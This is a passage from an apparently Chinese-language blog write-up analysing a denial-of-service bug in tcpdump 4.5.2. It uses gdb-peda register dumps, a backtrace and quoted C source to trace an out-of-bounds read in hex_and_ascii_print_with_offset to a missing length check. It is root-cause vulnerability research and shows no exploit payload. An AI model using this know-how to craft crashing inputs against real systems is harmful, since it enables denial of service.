ECX: 0xbfffee10 --&gt; 0x3 
EDX: 0xbfffee34 --&gt; 0x0 
ESI: 0xb7dce000 --&gt; 0x1b1db0 
EDI: 0xb7dce000 --&gt; 0x1b1db0 
EBP: 0xbfffedf8 --&gt; 0x0 
ESP: 0xbfffede8 --&gt; 0xbfffee10 --&gt; 0x3 
EIP: 0x80c084b (&lt;main+17&gt;:    sub    esp,0x11c8)
EFLAGS: 0x200286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80c0848 &lt;main+14&gt;:    push   esi
   0x80c0849 &lt;main+15&gt;:    push   ebx
   0x80c084a &lt;main+16&gt;:    push   ecx
=&gt; 0x80c084b &lt;main+17&gt;:    sub    esp,0x11c8
   0x80c0851 &lt;main+23&gt;:    mov    eax,ecx
   0x80c0853 &lt;main+25&gt;:    mov    DWORD PTR [ebp-0x11cc],eax
   0x80c0859 &lt;main+31&gt;:    mov    eax,DWORD PTR [eax+0x4]
   0x80c085c &lt;main+34&gt;:    mov    DWORD PTR [ebp-0x119c],eax
[------------------------------------stack-------------------------------------]
0000| 0xbfffede8 --&gt; 0xbfffee10 --&gt; 0x3 
0004| 0xbfffedec --&gt; 0x0 
0008| 0xbfffedf0 --&gt; 0xb7dce000 --&gt; 0x1b1db0 
0012| 0xbfffedf4 --&gt; 0xb7dce000 --&gt; 0x1b1db0 
0016| 0xbfffedf8 --&gt; 0x0 
0020| 0xbfffedfc --&gt; 0xb7c34637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
0024| 0xbfffee00 --&gt; 0xb7dce000 --&gt; 0x1b1db0 
0028| 0xbfffee04 --&gt; 0xb7dce000 --&gt; 0x1b1db0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 2, 0x080c084b in main ()
</code></pre><p>我们再次直接<code>run</code>，此处依旧是越界访问，只是没有开优化导致汇编语句有些不一样，其实是一样的</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x8256000 
EBX: 0xbfffd998 (&quot;.......&quot;)
ECX: 0x8256001 
EDX: 0xb7d626a0 --&gt; 0x20002 
ESI: 0x0 
EDI: 0x5 
EBP: 0xbfffdad8 --&gt; 0xbfffdaf8 --&gt; 0xbfffdb18 --&gt; 0xbfffdb48 --&gt; 0xbfffdb78 --&gt; 0xbfffdbac (--&gt; ...)
ESP: 0xbfffd940 --&gt; 0x8126d2e --&gt; 0x4700090a (&#39;\n\t&#39;)
EIP: 0x80547ff (&lt;hex_and_ascii_print_with_offset+112&gt;:    movzx  eax,BYTE PTR [eax])
EFLAGS: 0x210202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80547f4 &lt;hex_and_ascii_print_with_offset+101&gt;:    mov    eax,ecx
   0x80547f6 &lt;hex_and_ascii_print_with_offset+103&gt;:    lea    ecx,[eax+0x1]
   0x80547f9 &lt;hex_and_ascii_print_with_offset+106&gt;:    mov    DWORD PTR [ebp-0x190],ecx
=&gt; 0x80547ff &lt;hex_and_ascii_print_with_offset+112&gt;:    movzx  eax,BYTE PTR [eax]
   0x8054802 &lt;hex_and_ascii_print_with_offset+115&gt;:    movzx  eax,al
   0x8054805 &lt;hex_and_ascii_print_with_offset+118&gt;:    mov    ecx,eax
   0x8054807 &lt;hex_and_ascii_print_with_offset+120&gt;:    mov    DWORD PTR [ebp-0x194],ecx
   0x805480d &lt;hex_and_ascii_print_with_offset+126&gt;:    mov    edx,DWORD PTR [ebp-0x17c]
[------------------------------------stack-------------------------------------]
0000| 0xbfffd940 --&gt; 0x8126d2e --&gt; 0x4700090a (&#39;\n\t&#39;)
0004| 0xbfffd944 --&gt; 0x0 
0008| 0xbfffd948 --&gt; 0x8256001 
0012| 0xbfffd94c --&gt; 0x7ffef9e3 
0016| 0xbfffd950 --&gt; 0x922 (&#39;&quot;\t&#39;)
0020| 0xbfffd954 --&gt; 0xb7c29618 --&gt; 0x72647800 (&#39;&#39;)
0024| 0xbfffd958 --&gt; 0xb7c29148 --&gt; 0x50a8 
0028| 0xbfffd95c --&gt; 0xbfffd97f --&gt; 0x30303000 (&#39;&#39;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x080547ff in hex_and_ascii_print_with_offset ()
</code></pre><p>查看函数调用栈</p>
<pre><code>gdb-peda$ bt
#0  0x080547ff in hex_and_ascii_print_with_offset ()
#1  0x08054a2e in hex_and_ascii_print ()
#2  0x080c2e1a in ndo_default_print ()
#3  0x0805219e in ieee802_15_4_if_print ()
#4  0x080c2c7f in print_packet ()
#5  0x080e8468 in pcap_offline_read (p=0x82351b8, cnt=0xffffffff, callback=0x80c2c13 &lt;print_packet&gt;, 
    user=0xbfffdcbc &quot; :#\b\312\035\005\b\001&quot;) at ./savefile.c:409
#6  0x080d9d83 in pcap_loop (p=0x82351b8, cnt=0xffffffff, callback=0x80c2c13 &lt;print_packet&gt;, 
    user=0xbfffdcbc &quot; :#\b\312\035\005\b\001&quot;) at ./pcap.c:849
#7  0x080c2229 in main ()
#8  0xb7c34637 in __libc_start_main (main=0x80c083a &lt;main&gt;, argc=0x3, argv=0xbfffeea4, init=0x80f7300 &lt;__libc_csu_init&gt;, 
    fini=0x80f7360 &lt;__libc_csu_fini&gt;, rtld_fini=0xb7fea8a0 &lt;_dl_fini&gt;, stack_end=0xbfffee9c) at ../csu/libc-start.c:291
#9  0x0804a3d3 in _start ()
</code></pre><p>从<code>main()</code>函数开始，最先进入的是<code>pcap_loop()</code>函数，我们整理出整个调用路径</p>
<pre><code>0x080547ff hex_and_ascii_print_with_offset()
0x08054a2e hex_and_ascii_print()
0x080c2e1a ndo_default_print()
0x0805219e ieee802_15_4_if_print()
0x080c2c7f print_packet()
0x080e8468 pcap_offline_read()
0x080d9d83 pcap_loop()
0x080c2229 main()
</code></pre><p>重新启动，给上面列出来的第一个函数地址下断点，下完断点后进行查看</p>
<pre><code>gdb-peda$ i b
Num     Type           Disp Enb Address    What
3       breakpoint     keep y   0x080547ff &lt;hex_and_ascii_print_with_offset+112&gt;
</code></pre><p>确定断点有效之后重新跑起来，然后我们走几步后发现这个位置其实是一个循环，这一直在循环读取数据</p>
<p>使用IDA反编译，到达该位置</p>
<p><img src="Image/3.png" alt=""></p>
<p>然后发现这里是在循环读取数据帧进行输出，在读取的时候并没有对地址做判断，导致读取越界，最终造成拒绝服务</p>
<p><img src="Image/4.png" alt=""></p>
<p>然后我们来看源码，源码的关键位置在最前面我们输出过的，这里截取关键的部分，传入的是数据帧的地址，然后进行循环读取，每次读取两个字节，所以前面有一个计算，并且将计算结果作为循环的判断条件，由于没有判断读取的内存地址是否合法以及没有判断数据帧长度的问题，导致的问题</p>
<pre><code>void
hex_and_ascii_print_with_offset(register const char *ident,
    register const u_char *cp, register u_int length, register u_int oset)
{
    register u_int i;
    register int s1, s2;
    register int nshorts;
    char hexstuff[HEXDUMP_SHORTS_PER_LINE*HEXDUMP_HEXSTUFF_PER_SHORT+1], *hsp;
    char asciistuff[ASCII_LINELENGTH+1], *asp;

    nshorts = length / sizeof(u_short);
    i = 0;
    hsp = hexstuff; asp = asciistuff;
    while (--nshorts &gt;= 0) {
        s1 = *cp++;
        s2 = *cp++;
        (void)snprintf(hsp, sizeof(hexstuff) - (hsp - hexstuff),
            &quot; %02x%02x&quot;, s1, s2);
        hsp += HEXDUMP_HEXSTUFF_PER_SHORT;
        *(asp++) = (isgraph(s1) ? s1 : &#39;.&#39;);
        *(asp++) = (isgraph(s2) ? s2 : &#39;.&#39;);
        i++;
        if (i &gt;= HEXDUMP_SHORTS_PER_LINE) {
            *hsp = *asp = &#39;\0&#39;;
            (void)printf(&quot;%s0x%04x: %-*s  %s&quot;,
                ident, oset, HEXDUMP_HEXSTUFF_PER_LINE,
                hexstuff, asciistuff);
            i = 0; hsp = hexstuff; asp = asciistuff;
            oset += HEXDUMP_BYTES_PER_LINE;
        }
    }
</code></pre><h2 id="reference">Reference</h2>
<ul>
<li>Ubuntu14.04下源码安装tcpdump：<a href="http://blog.csdn.net/zjutchenjm/article/details/40433339">http://blog.csdn.net/zjutchenjm/article/details/40433339</a></li><li>tcpdump 4.5.2拒绝服务漏洞：<a href="http://whereisk0shl.top/post/2016-10-23-1">http://whereisk0shl.top/post/2016-10-23-1</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
